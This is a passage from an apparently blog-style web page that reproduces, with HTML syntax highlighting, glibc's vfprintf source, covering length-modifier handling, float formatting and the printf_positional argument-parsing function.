class="line">      done = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> all_done;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">prec = <span class="number">0</span>;</span><br><span class="line">      JUMP (*f, step2_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process &#x27;h&#x27; modifier.  There might another &#x27;h&#x27; following.  */</span></span><br><span class="line">    LABEL (mod_half):</span><br><span class="line">      is_short = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step3a_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process &#x27;hh&#x27; modifier.  */</span></span><br><span class="line">    LABEL (mod_halfhalf):</span><br><span class="line">      is_short = <span class="number">0</span>;</span><br><span class="line">      is_char = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process &#x27;l&#x27; modifier.  There might another &#x27;l&#x27; following.  */</span></span><br><span class="line">    LABEL (mod_long):</span><br><span class="line">      is_long = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step3b_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process &#x27;L&#x27;, &#x27;q&#x27;, or &#x27;ll&#x27; modifier.  No other modifier is</span></span><br><span class="line"><span class="comment"> allowed to follow.  */</span></span><br><span class="line">    LABEL (mod_longlong):</span><br><span class="line">      is_long_double = <span class="number">1</span>;</span><br><span class="line">      is_long = <span class="number">1</span>;</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (<span class="type">mod_size_t</span>):</span><br><span class="line">      is_long_double = <span class="keyword">sizeof</span> (<span class="type">size_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line">      is_long = <span class="keyword">sizeof</span> (<span class="type">size_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (<span class="type">mod_ptrdiff_t</span>):</span><br><span class="line">      is_long_double = <span class="keyword">sizeof</span> (<span class="type">ptrdiff_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line">      is_long = <span class="keyword">sizeof</span> (<span class="type">ptrdiff_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">    LABEL (<span class="type">mod_intmax_t</span>):</span><br><span class="line">      is_long_double = <span class="keyword">sizeof</span> (<span class="type">intmax_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line">      is_long = <span class="keyword">sizeof</span> (<span class="type">intmax_t</span>) &gt; <span class="keyword">sizeof</span> (<span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">      JUMP (*++f, step4_jumps);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process current format.  */</span></span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_int() va_arg (ap, int)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_long_int() va_arg (ap, long int)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_long_long_int() va_arg (ap, long long int)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_pointer() va_arg (ap, void *)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_string() va_arg (ap, const char *)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_unsigned_int() va_arg (ap, unsigned int)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_unsigned_long_int() va_arg (ap, unsigned long int)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_unsigned_long_long_int() va_arg (ap, unsigned long long int)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_wchar_t() va_arg (ap, wchar_t)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_wstring() va_arg (ap, const wchar_t *)</span></span><br><span class="line">  process_arg ();</span><br><span class="line">  process_string_arg ();</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_long_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_pointer</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_string</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_unsigned_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_unsigned_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_unsigned_long_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_wchar_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_wstring</span></span><br><span class="line"></span><br><span class="line">LABEL (form_float):</span><br><span class="line">LABEL (form_floathex):</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class="number">0</span>))</span><br><span class="line">      is_long_double = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">printf_info</span> <span class="title">info</span> =</span></span><br><span class="line">      &#123;</span><br><span class="line">.prec = prec,</span><br><span class="line">.width = width,</span><br><span class="line">.spec = spec,</span><br><span class="line">.is_long_double = is_long_double,</span><br><span class="line">.is_short = is_short,</span><br><span class="line">.is_long = is_long,</span><br><span class="line">.alt = alt,</span><br><span class="line">.space = space,</span><br><span class="line">.left = left,</span><br><span class="line">.showsign = showsign,</span><br><span class="line">.group = group,</span><br><span class="line">.pad = pad,</span><br><span class="line">.extra = <span class="number">0</span>,</span><br><span class="line">.i18n = use_outdigits,</span><br><span class="line">.wide = <span class="keyword">sizeof</span> (CHAR_T) != <span class="number">1</span>,</span><br><span class="line">.is_binary128 = <span class="number">0</span></span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">    PARSE_FLOAT_VA_ARG_EXTENDED (info);</span><br><span class="line">    <span class="type">const</span> <span class="type">void</span> *ptr = &amp;the_arg;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> function_done = __printf_fp_spec (s, &amp;info, &amp;ptr);</span><br><span class="line">    <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">done = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">goto</span> all_done;</span><br><span class="line">      &#125;</span><br><span class="line">    done_add (function_done);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">LABEL (form_unknown):</span><br><span class="line">  <span class="keyword">if</span> (spec == L_(<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* The format string ended before the specifier is complete.  */</span></span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      done = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> all_done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we are in the fast loop force entering the complicated</span></span><br><span class="line"><span class="comment">     one.  */</span></span><br><span class="line">  <span class="keyword">goto</span> do_positional;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* The format is correctly handled.  */</span></span><br><span class="line">      ++nspecs_done;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Look for next format specifier.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      f = __find_specwc ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      f = __find_specmb ((end_of_spec = ++f));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Write the following constant string.  */</span></span><br><span class="line">      outstring (end_of_spec, f - end_of_spec);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (*f != L_(<span class="string">&#x27;\0&#x27;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Unlock stream and return.  */</span></span><br><span class="line">  <span class="keyword">goto</span> all_done;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Hand off processing for positional parameters.  */</span></span><br><span class="line">do_positional:</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">    save_errno, grouping, thousands_sep, mode_flags);</span><br><span class="line"></span><br><span class="line"> all_done:</span><br><span class="line">  <span class="comment">/* Unlock the stream.  */</span></span><br><span class="line">  _IO_funlockfile (s);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="printf-positional"><a href="#printf-positional" class="headerlink" title="printf_positional"></a>printf_positional</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">printf_positional</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, <span class="type">int</span> readonly_format,</span></span><br><span class="line"><span class="params">   va_list ap, va_list *ap_savep, <span class="type">int</span> done, <span class="type">int</span> nspecs_done,</span></span><br><span class="line"><span class="params">   <span class="type">const</span> UCHAR_T *lead_str_end,</span></span><br><span class="line"><span class="params">   CHAR_T *work_buffer, <span class="type">int</span> save_errno,</span></span><br><span class="line"><span class="params">   <span class="type">const</span> <span class="type">char</span> *grouping, THOUSANDS_SEP_T thousands_sep,</span></span><br><span class="line"><span class="params">   <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* For positional argument handling.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">scratch_buffer</span> <span class="title">specsbuf</span>;</span></span><br><span class="line">  scratch_buffer_init (&amp;specsbuf);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">printf_spec</span> *<span class="title">specs</span> =</span> specsbuf.data;</span><br><span class="line">  <span class="type">size_t</span> specs_limit = specsbuf.length / <span class="keyword">sizeof</span> (specs[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Used as a backing store for args_value, args_size, args_type</span></span><br><span class="line"><span class="comment">     below.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">scratch_buffer</span> <span class="title">argsbuf</span>;</span></span><br><span class="line">  scratch_buffer_init (&amp;argsbuf);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Array with information about the needed arguments.  This has to</span></span><br><span class="line"><span class="comment">     be dynamically extensible.  */</span></span><br><span class="line">  <span class="type">size_t</span> nspecs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The number of arguments the format string requests.  This will</span></span><br><span class="line"><span class="comment">     determine the size of the array needed to store the argument</span></span><br><span class="line"><span class="comment">     attributes.  */</span></span><br><span class="line">  <span class="type">size_t</span> nargs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Positional parameters refer to arguments directly.  This could</span></span><br><span class="line"><span class="comment">     also determine the maximum number of arguments.  Track the</span></span><br><span class="line"><span class="comment">     maximum number.  */</span></span><br><span class="line">  <span class="type">size_t</span> max_ref_arg = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Just a counter.  */</span></span><br><span class="line">  <span class="type">size_t</span> cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (grouping == (<span class="type">const</span> <span class="type">char</span> *) <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      thousands_sep = _NL_CURRENT_WORD (LC_NUMERIC,</span><br><span class="line">_NL_NUMERIC_THOUSANDS_SEP_WC);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      thousands_sep = _NL_CURRENT (LC_NUMERIC, THOUSANDS_SEP);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      grouping = _NL_CURRENT (LC_NUMERIC, GROUPING);</span><br><span class="line">      <span class="keyword">if</span> (*grouping == <span class="string">&#x27;\0&#x27;</span> || *grouping == CHAR_MAX)</span><br><span class="line">grouping = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">const</span> UCHAR_T *f = lead_str_end; *f != L_(<span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line">       f = specs[nspecs++].next_fmt)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (nspecs == specs_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (!scratch_buffer_grow_preserve (&amp;specsbuf))</span><br><span class="line">    &#123;</span><br><span class="line">      done = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> all_done;</span><br><span class="line">    &#125;</span><br><span class="line">  specs = specsbuf.data;</span><br><span class="line">  specs_limit = specsbuf.length / <span class="keyword">sizeof</span> (specs[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Parse the format specifier.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_WPRINTF</span></span><br><span class="line">      nargs += __parse_one_specwc (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Determine the number of arguments the format string consumes.  */</span></span><br><span class="line">  nargs = MAX (nargs, max_ref_arg);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">printf_arg</span> *<span class="title">args_value</span>;</span></span><br><span class="line">  <span class="type">int</span> *args_size;</span><br><span class="line">  <span class="type">int</span> *args_type;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Calculate total size needed to represent a single argument</span></span><br><span class="line"><span class="comment">       across all three argument-related arrays.  */</span></span><br><span class="line">    <span class="type">size_t</span> bytes_per_arg</span><br><span class="line">      = <span class="keyword">sizeof</span> (*args_value) + <span class="keyword">sizeof</span> (*args_size) + <span class="keyword">sizeof</span> (*args_type);</span><br><span class="line">    <span class="keyword">if</span> (!scratch_buffer_set_array_size (&amp;argsbuf, nargs, bytes_per_arg))</span><br><span class="line">      &#123;</span><br><span class="line">done = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">goto</span> all_done;</span><br><span class="line">      &#125;</span><br><span class="line">    args_value = argsbuf.data;</span><br><span class="line">    <span class="comment">/* Set up the remaining two arrays to each point past the end of</span></span><br><span class="line"><span class="comment">       the prior array, since space for all three has been allocated</span></span><br><span class="line"><span class="comment">       now.  */</span></span><br><span class="line">    args_size = &amp;args_value[nargs].pa_int;</span><br><span class="line">    args_type = &amp;args_size[nargs];</span><br><span class="line">    <span class="built_in">memset</span> (args_type, (mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span> ? <span class="string">&#x27;\xff&#x27;</span> : <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">    nargs * <span class="keyword">sizeof</span> (*args_type));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* XXX Could do sanity check here: If any element in ARGS_TYPE is</span></span><br><span class="line"><span class="comment">     still zero after this loop, format is invalid.  For now we</span></span><br><span class="line"><span class="comment">     simply use 0 as the value.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fill in the types of all the arguments.  */</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the width is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].width_arg != <span class="number">-1</span>)</span><br><span class="line">args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[cnt].prec_arg != <span class="number">-1</span>)</span><br><span class="line">args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (specs[cnt].ndata_args)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">/* No arguments.  */</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">/* One argument; we already have the</span></span><br><span class="line"><span class="comment">   type and size.  */</span></span><br><span class="line">  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class="line">  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">/* We have more than one argument for this format spec.</span></span><br><span class="line"><span class="comment">     We must call the arginfo function again to determine</span></span><br><span class="line"><span class="comment">     all the types.  */</span></span><br><span class="line">  (<span class="type">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">    (&amp;specs[cnt].info,</span><br><span class="line">     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line">     &amp;args_size[specs[cnt].data_arg]);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now we know all the types and the order.  Fill in the argument</span></span><br><span class="line"><span class="comment">     values.  */</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nargs; ++cnt)</span><br><span class="line">    <span class="keyword">switch</span> (args_type[cnt])</span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T(tag, mem, type)\</span></span><br><span class="line"><span class="meta">case tag:\</span></span><br><span class="line"><span class="meta">  args_value[cnt].mem = va_arg (*ap_savep, type); \</span></span><br><span class="line"><span class="meta">  break</span></span><br><span class="line"></span><br><span class="line">T (PA_WCHAR, pa_wchar, <span class="type">wint_t</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_CHAR:<span class="comment">/* Promoted.  */</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_SHORT:<span class="comment">/* Promoted.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == INT_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">T (PA_INT, pa_int, <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX == LONG_LONG_MAX</span></span><br><span class="line">      <span class="keyword">case</span> PA_INT|PA_FLAG_LONG:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">T (PA_INT|PA_FLAG_LONG_LONG, pa_long_long_int, <span class="type">long</span> <span class="type">long</span> <span class="type">int</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LONG_MAX != INT_MAX &amp;&amp; LONG_MAX != LONG_LONG_MAX</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> <span class="string">&quot;he?&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">case</span> PA_FLOAT:<span class="comment">/* Promoted.  */</span></span><br><span class="line">T (PA_DOUBLE, pa_double, <span class="type">double</span>);</span><br><span class="line">      <span class="keyword">case</span> PA_DOUBLE|PA_FLAG_LONG_DOUBLE:</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    args_value[cnt].pa_double = va_arg (*ap_savep, <span class="type">double</span>);</span><br><span class="line">    args_type[cnt] &amp;= ~PA_FLAG_LONG_DOUBLE;</span><br><span class="line">  